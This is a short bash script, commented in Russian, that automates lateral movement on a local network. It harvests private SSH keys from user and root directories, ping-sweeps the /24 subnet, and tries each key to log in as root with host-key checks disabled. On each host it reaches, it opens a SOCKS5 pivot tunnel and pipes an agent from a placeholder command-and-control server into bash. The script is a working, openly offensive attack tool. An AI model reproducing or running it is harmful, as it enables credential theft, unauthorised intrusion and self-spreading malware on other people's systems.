#!/bin/bash
# Авто-пивот — проброс туннеля при обнаружении нового хоста
SUBNET=$(ip route 2>/dev/null | grep -oP 'src \K[\d.]+' | head -1 | cut -d. -f1-3)
[ -z "$SUBNET" ] && SUBNET="192.168.1"

echo "[AUTO-PIVOT] Monitoring $SUBNET.0/24..."

# Собираем SSH ключи
KEYS=$(find ~/.ssh /root/.ssh /home -name "id_rsa" -o -name "id_dsa" 2>/dev/null | head -5)

while true; do
    for i in {1..254}; do
        ip="$SUBNET.$i"
        ping -c1 -W1 "$ip" >/dev/null 2>&1 || continue
        
        # Пробуем SSH с каждым ключом
        for key in $KEYS; do
            ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 -i "$key" -f -N -D 1080 "root@$ip" 2>/dev/null && \
                echo "🔗 PIVOT: $ip (SOCKS5 на localhost:1080)"
            
            # Если получилось — запускаем агента
            ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 -i "$key" "root@$ip" \
                "curl -sk https://YOUR_C2/agent | bash" 2>/dev/null &
        done
    done
    sleep 30
done
